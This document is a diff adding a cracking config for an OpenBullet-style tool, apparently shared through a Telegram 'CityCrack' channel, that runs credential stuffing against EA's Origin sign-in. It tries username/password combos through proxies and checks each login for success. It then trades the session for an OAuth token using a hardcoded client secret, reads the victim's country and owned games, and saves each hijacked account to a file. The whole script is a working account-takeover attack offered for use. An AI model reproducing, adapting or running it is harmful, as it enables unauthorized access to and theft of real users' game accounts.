@@ -1,0 +1,180 @@
+[SETTINGS]
+{
+  "Name": "Origin new",
+  "SuggestedBots": 85,
+  "MaxCPM": 0,
+  "LastModified": "2020-12-23T18:10:40.4535148+03:30",
+  "AdditionalInfo": "My Channel ID t.me/CityCrack",
+  "Author": "\"mr_amirho3ein\"",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834" 
+  
+  HEADER "Host: signin.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Post REQUEST POST "<HEADERS(selflocation)>" 
+  CONTENT "email=<USER>&password=<PASS>&_eventId=submit&cid=N6cmyXT8RBivkzvXpkoMz20uANW8qif1&showAgeUp=true&googleCaptchaResponse=&thirdPartyCaptchaResponse=&_rememberMe=on&_loginInvisible=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: signin.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 200" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://signin.ea.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://signin.ea.com/p/originX/login?execution=e565158102s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fpc_machine_id%3D15173374696391813834%26display%3DoriginX%252Flogin%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26locale%3Den_US%26nonce%3D1256%26client_id%3DORIGIN_PC" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "latestSuccessLogin" 
+  KEYCHAIN Failure OR 
+    KEY "Your credentials are incorrect or have expired" 
+
+#XXX PARSE "<SOURCE>" LR "fid=" "\";" -> VAR "XXX" 
+
+#CC REQUEST GET "https://accounts.ea.com/connect/auth?client_id=ORIGIN_PC&response_type=code+id_token&redirect_uri=qrc%3A%2F%2F%2Fhtml%2Flogin_successful.html&display=originX%2Flogin&locale=en_US&nonce=1256&pc_machine_id=15173374696391813834&fid=<XXX>" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.8.0 Chrome/53.0.2785.148 Safari/537.36 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Host: accounts.ea.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://signin.ea.com/p/originX/login?execution=e1633018870s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fclient_id%3DORIGIN_PC%26response_type%3Dcode%2Bid_token%26redirect_uri%3Dqrc%253A%252F%252F%252Fhtml%252Flogin_successful.html%26display%3DoriginX%252Flogin%26locale%3Den_US%26nonce%3D1256%26pc_machine_id%3D15173374696391813834" 
+
+#KOBS PARSE "<HEADERS(Location)>" LR "code=" "&id_" -> VAR "KON" 
+
+#TK REQUEST POST "https://accounts.ea.com/connect/token" 
+  CONTENT "grant_type=authorization_code&code=<KON>&client_id=ORIGIN_PC&client_secret=UIY8dwqhi786T78ya8Kna78akjcp0s&redirect_uri=qrc:///html/login_successful.html" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Origin-UID: 17524622993368447356" 
+  HEADER "X-Origin-Platform: PCWIN" 
+  HEADER "localeInfo: en_US" 
+  HEADER "Accept-Language: en-US" 
+
+#TK PARSE "<SOURCE>" LR "access_token\" : \"" "\"," -> VAR "Token" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Retry OR 
+    KEY "<SOURCE>" DoesNotContain "access_token" 
+
+#CCC REQUEST GET "https://gateway.ea.com/proxy/identity/pids/me" 
+  
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "X-Include-Underage: true" 
+  HEADER "X-Extended-Pids: true" 
+
+#PID PARSE "<SOURCE>" LR "pidId\" : " "," -> VAR "PID" 
+
+#Country PARSE "<SOURCE>" LR "country\" : \"" "\"," -> CAP "Country" 
+
+#CCGAME REQUEST GET "https://api1.origin.com/ecommerce2/basegames/<PID>?machine_hash=17524622993368447356" 
+  
+  HEADER "User-Agent: Mozilla/5.0 EA Download Manager Origin/10.5.37.24524" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.origin.v2+json" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "AuthToken: <Token>" 
+  HEADER "X-Origin-UID: 17524622993368447356" 
+  HEADER "X-Origin-Platform: PCWIN" 
+  HEADER "localeInfo: en_US" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Host: api1.origin.com" 
+
+#CCCCCC PARSE "<SOURCE>" LR "offerPath\" : \"/" "\"," Recursive=TRUE -> VAR "KIR1" 
+
+#CCCCC PARSE "<KIR1>" LR "/" "," Recursive=TRUE -> VAR "KIR" 
+
+#CCCC FUNCTION Replace "-" " " "<KIR>" -> VAR "KIR2" 
+
+#CC FUNCTION Replace "/" " = " "<KIR2>" -> VAR "KIR3" 
+
+#CC FUNCTION Replace "," " / " "<KIR3>" -> CAP "Games List" 
+
+#CC FUNCTION Replace "[" "" "<Games List>" -> VAR "R1" 
+
+#CC FUNCTION Replace "]" "" "<R1>" -> VAR "R2" 
+
+#C FUNCTION Replace " / " "\\n" "<R2>" -> VAR "R3" 
+
+#C FUNCTION CountOccurrences "\\n" "<R3>" -> VAR "R4" 
+
+#C FUNCTION Compute "<R4>+1" -> CAP "Number Of Games" 
+
+FUNCTION Constant "t.me/CityCrack" -> CAP "My Channel ID" 
+
+#Save UTILITY File "Origin Accounts .txt" AppendLines "<<<<<<=Account=>>>>>>\\nCombo: <USER:<PASS>\\nEmail\\Username: <USER> \\nPassword: <PASS>\\n<<<<<<<<<<=INFO=>>>>>>>>>>\\nCountry: <Country>\\nNumber Of Games: <Number Of Games>\\n(((Games List)))\\n <R3>\\n\\n\\nConfiged By: T.me/mr_amirho3ein\\nTelegram Channel: T.me/CityCrack\\n========================================================================" -> VAR "Save" 
+
